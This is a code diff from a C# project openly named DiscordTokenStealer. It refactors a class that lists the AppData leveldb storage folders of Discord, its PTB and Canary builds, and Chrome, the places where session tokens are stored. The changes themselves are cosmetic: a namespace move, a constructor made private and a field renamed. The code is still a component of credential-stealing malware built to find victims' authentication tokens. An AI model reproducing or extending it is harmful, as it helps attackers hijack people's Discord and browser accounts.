@@ -1,10 +1,10 @@
 ﻿using DiscordTokenStealer.Helpers;
-using DiscordTokenStealer.DirectorySearchProviders;
 
-namespace DiscordTokenStealer.Services;
+namespace DiscordTokenStealer.DirectorySearchProviders;
+
 public sealed partial class AppDataSearchProvider : DirectorySearchProvider
 {
-    public AppDataSearchProvider(string directory, string searchPattern = "*.ldb") : base(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), directory), searchPattern)
+    private AppDataSearchProvider(string directory, string searchPattern = "*.ldb") : base(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), directory), searchPattern)
     {
 
     }
@@ -13,7 +13,7 @@ public sealed partial class AppDataSearchProvider : DirectorySearchProvider
 public sealed partial class AppDataSearchProvider
 {
     public static readonly AppDataSearchProvider Discord = new AppDataSearchProvider("discord\\Local Storage\\leveldb");
-    public static readonly AppDataSearchProvider DiscordPTB = new AppDataSearchProvider("discordptb\\Local Storage\\leveldb");
+    public static readonly AppDataSearchProvider DiscordPtb = new AppDataSearchProvider("discordptb\\Local Storage\\leveldb");
     public static readonly AppDataSearchProvider DiscordCanary = new AppDataSearchProvider("discordcanary\\Local Storage\\leveldb");
 
     public static readonly AppDataSearchProvider Chrome = new AppDataSearchProvider("Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb");
